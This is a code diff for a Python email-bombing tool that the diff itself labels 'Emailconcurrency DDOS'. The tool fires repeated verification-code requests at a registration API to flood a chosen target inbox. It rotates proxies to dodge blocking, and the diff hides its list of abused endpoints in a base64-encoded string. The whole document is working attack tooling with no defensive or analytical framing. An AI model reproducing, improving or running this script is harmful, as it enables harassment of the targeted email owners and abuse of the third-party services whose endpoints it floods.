@@ -6,29 +6,34 @@ import sys
 import os
 from colorama import Fore, Style, init
 import random
-
-
+import base64
+import json
 
 os.system("cls" if os.name == "nt" else "clear")
-
 init()
 
 VERSION = "1.0.2"
-UPDATE_URL = "https://raw.githubusercontent.com/TR1123/ChickFRP-Email/main/1.py"
-API_LIST = {
-    "chickfrp": {
-        "name": "ChickFRP Registration",
-        "url": "https://api.chickfrp.com/email_code",
-        "method": "POST",
-        "param_name": "email"
-    },
-    "example_api": {
-        "name": "Example API",
-        "url": "https://api.example.com/endpoint",
-        "method": "POST",
-        "param_name": "email"
-    }
-}
+UPDATE_URL = "https://www.github.com/TR1123/Emailconcurrency/Emailconcurrency.py"
+
+
+ENCRYPTED_API_LIST = "eyJjaGlja2ZycCI6IHsibmFtZSI6ICJDaGlja0ZSUCBSZWdpc3RyYXRpb24iLCAidXJsIjogImh0dHBzOi8v" \
+"YXBpLmNoaWNrZnJwLmNvbS9lbWFpbF9jb2RlIiwgIm1ldGhvZCI6ICJQT1NUIiwgInBhcmFtX25hbWUiOiAiZW1haWwifSwgImV4YW1wb" \
+"GVfYXBpIjogeyJuYW1lIjogIkV4YW1wbGUgQVBJIiwgInVybCI6ICJodHRwczovL2FwaS5leGFtcGxlLmNvbS9lbmRwb2ludCIsICJtZX" \
+"Rob2QiOiAiUE9TVCIsICJwYXJhbV9uYW1lIjogImVtYWlsIn19"
+
+def decode_api_list(encoded_data):
+
+    try:
+        decoded_bytes = base64.b64decode(encoded_data)
+        return json.loads(decoded_bytes.decode('utf-8'))
+    except Exception as e:
+        pass
+        return None
+
+
+API_LIST = decode_api_list(ENCRYPTED_API_LIST)
+if not API_LIST:
+    sys.exit(1)
 
 def print_colored(text, color):
     print(f"{color}{text}{Style.RESET_ALL}")
@@ -46,7 +51,6 @@ def show_banner():
     print()
 
 def load_proxies(proxy_file):
-    
     try:
         with open(proxy_file, 'r') as f:
             proxies = [line.strip() for line in f if line.strip()]
@@ -71,7 +75,6 @@ def send_email(api, email, proxy=None):
         print(f"{Fore.RED}[-] Error sending to {email}/发送到 {email} 出错: {str(e)} {f'Proxy/代理: {proxy}' if proxy else ''}{Fore.RESET}")
 
 def view_apis():
-
     print(f"\n{Fore.CYAN}Available API Endpoints/可用API接口:{Fore.RESET}")
     for api_name, api_info in API_LIST.items():
         print(f"\n{Fore.YELLOW}API Name/接口名称: {api_name}{Fore.RESET}")
@@ -82,11 +85,9 @@ def view_apis():
     print()
 
 def check_version():
-
     print(f"\n{Fore.GREEN}Current Version/当前版本: {VERSION}{Fore.RESET}\n")
 
 def update_script():
-    
     try:
         print(f"{Fore.YELLOW}[*] Checking for updates/检查更新中...{Fore.RESET}")
         response = requests.get(UPDATE_URL)
@@ -102,7 +103,6 @@ def update_script():
         print(f"{Fore.RED}[-] Update failed/更新失败: {str(e)}{Fore.RESET}")
 
 def main():
-    
     class BilingualFormatter(argparse.HelpFormatter):
         def _format_action(self, action):
             if action.help:
@@ -111,59 +111,23 @@ def main():
                     action.help = f"{parts[0].strip()} ({parts[1].strip()})"
             return super()._format_action(action)
 
-
     parser = argparse.ArgumentParser(
-        description="Email Sending Tool/邮件发送工具",
+        description="Emailconcurrency DDOS",
         formatter_class=BilingualFormatter
     )
     
-    parser.add_argument(
-        "--email", 
-        help="Target email address/目标邮箱地址"
-    )
-    parser.add_argument(
-        "--request", 
-        type=int, 
-        help="Total number of requests/总请求次数"
-    )
-    parser.add_argument(
-        "--requ", 
-        type=int, 
-        help="Number of requests per cycle/每次循环请求次数"
-    )
-    parser.add_argument(
-        "--time", 
-        type=int, 
-        help="Cycle interval in seconds/循环间隔时间(秒)"
-    )
-    parser.add_argument(
-        "--input", 
-        action="store_true", 
-        help="Use interactive input mode/使用交互式输入模式"
-    )
-    parser.add_argument(
-        "--proxy", 
-        help="Path to proxy IP file/代理IP文件路径"
-    )
-    parser.add_argument(
-        "--view", 
-        action="store_true", 
-        help="View available API endpoints/查看可用API接口"
-    )
-    parser.add_argument(
-        "--version", 
-        action="store_true", 
-        help="Show current version/显示当前版本"
-    )
-    parser.add_argument(
-        "--update", 
-        action="store_true", 
-        help="Update the script/更新脚本"
-    )
+    parser.add_argument("--email", help="Target email address/目标邮箱地址")
+    parser.add_argument("--request", type=int, help="Total number of requests/总请求次数")
+    parser.add_argument("--requ", type=int, help="Number of requests per cycle/每次循环请求次数")
+    parser.add_argument("--time", type=int, help="Cycle interval in seconds/循环间隔时间(秒)")
+    parser.add_argument("--input", action="store_true", help="Use interactive input mode/使用交互式输入模式")
+    parser.add_argument("--proxy", help="Path to proxy IP file/代理IP文件路径")
+    parser.add_argument("--view", action="store_true", help="View available API endpoints/查看可用API接口")
+    parser.add_argument("--version", action="store_true", help="Show current version/显示当前版本")
+    parser.add_argument("--update", action="store_true", help="Update the script/更新脚本")
     
     args = parser.parse_args()
 
-   
     if args.view:
         view_apis()
         return
@@ -176,7 +140,6 @@ def main():
 
     show_banner()
 
-   
     proxies = None
     if args.proxy:
         proxies = load_proxies(args.proxy)
@@ -185,15 +148,12 @@ def main():
             return
         print(f"{Fore.YELLOW}[*] Loaded {len(proxies)} proxy IPs/已加载 {len(proxies)} 个代理IP{Fore.RESET}")
 
-   
     if args.input or (not args.email and not args.request):
-      
         email = input(f"{Fore.GREEN}[*] Target email/目标邮箱：{Fore.RESET}")
         total_requests = int(input(f"{Fore.GREEN}[*] Total requests/总请求次数：{Fore.RESET}"))
         loop_requests = int(input(f"{Fore.GREEN}[*] Requests per cycle/每次循环请求次数：{Fore.RESET}"))
         interval = int(input(f"{Fore.GREEN}[*] Cycle interval (seconds)/循环间隔时间(秒)：{Fore.RESET}"))
     else:
-    
         if not args.email or not args.request:
             print(f"{Fore.RED}[!] Error: Must provide both --email and --request parameters/错误：必须提供 --email 和 --request 参数{Fore.RESET}")
             return
